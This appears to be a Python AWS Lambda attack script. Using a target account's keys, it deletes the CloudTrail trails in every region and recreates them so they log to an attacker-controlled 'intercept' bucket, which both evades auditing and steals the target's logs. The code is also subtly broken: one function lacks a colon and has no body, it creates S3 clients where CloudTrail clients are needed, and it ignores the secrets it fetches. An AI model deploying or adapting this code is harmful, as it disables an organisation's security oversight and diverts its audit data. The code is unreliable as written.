import boto3
import json
import os
"""
      Environment:
        Variables: 
          InterceptBucket: !Ref InterceptBucket
          TargetAccountKeyId: !Ref TargetAccountKeyId
          TargetAccountKeySecret: !Ref SSMIAMSecretKey
          TargetAccountKeySession: !Ref SSMIAMSessionToken
"""

trails_storage_key_format = "original_trails_%s.json"

def store_trail_configs(trail_configs, region, InterceptBucket):
    # Store the trail configs in a predictable location within the Intercept bucket.
    s3Client = boto3.client("s3")
    s3Client.put_object(
        Bucket=InterceptBucket,
        Key="original_trails_%s.json" % region,
        Body=trail_configs
    )
    return(trails_storage_key_format % region)

def disrupt_cloudtrail(ctClient, region, InterceptBucket):
    # Identify non-shadow trails in the region.
    trails = ctClient.describe_trails(
        IncludeShadowTrails=False
    )
    trails = trails['trailList']
    trailNames = [t['Name'] for t in trails]
    trailsSerialized = json.dumps(trails)

    store_trail_configs(trailsSerialized, region, InterceptBucket)

    for tn in trailNames:
        trailDeleted = False
        interceptCreated = False
        try:
            ctClient.delete_trail(
                Name=tn
            )
            trailDeleted = True
            print("Deleted trail %s in %s" % (tn, region))
        except Exception as e:
            print("Unable to delete trail %s in %s" % (tn, region))
        if trailDeleted:
            try:
                ctClient.create_trail(
                    Name=tn,
                    S3BucketName=InterceptBucket
                    )
                print("Created trail %s in %s" % (tn, region))
                interceptCreated = True
            except Exception as e:
                print("Unable to create interception trail")

def restore_cloudtrail(ctClient, region)
    # Restore the original CloudTrail configs to the account
    # Use the format string (trails_storage_key_format) and the region to retrieve the trails
    # Then re-create them as they were.
    return

def lambda_handler(event, context):
    # Pull the target out of env & SSM
    InterceptBucket = os.environ['InterceptBucket']
    TargetAccountKeyId = os.environ['TargetAccountKeyId']
    TargetAccountKeySecret = os.environ['TargetAccountKeySecret']
    TargetAccountKeySession = os.environ['TargetAccountKeySession']

    smClient = boto3.client("secretsmanager")
    
    awsKeySecret = smClient.get_secret_value(
        SecretId=TargetAccountKeySecret
    )
    awsSessionToken = smClient.get_secret_value(
        SecretId=TargetAccountKeySession
    )

    # Identify regions available within the partition.
    ec2Client = boto3.client("ec2")
    regions = ec2Client.describe_regions()
    regionNames = [r['RegionName'] for r in regions['Regions']]

    # Go through each region, create a cloudtrail client, and disrupt any trails.
    for r in regionNames:
        r_ctClient = None
        if TargetAccountKeySession is not "":
            r_ctClient = client = boto3.client(
                's3',
                aws_access_key_id=TargetAccountKeyId,
                aws_secret_access_key=TargetAccountKeySecret,
                aws_session_token=TargetAccountKeySession,
            )
        else:
            r_ctClient = client = boto3.client(
                's3',
                aws_access_key_id=TargetAccountKeyId,
                aws_secret_access_key=TargetAccountKeySecret
            )
        disrupt_cloudtrail(r_ctClient, r, InterceptBucket)
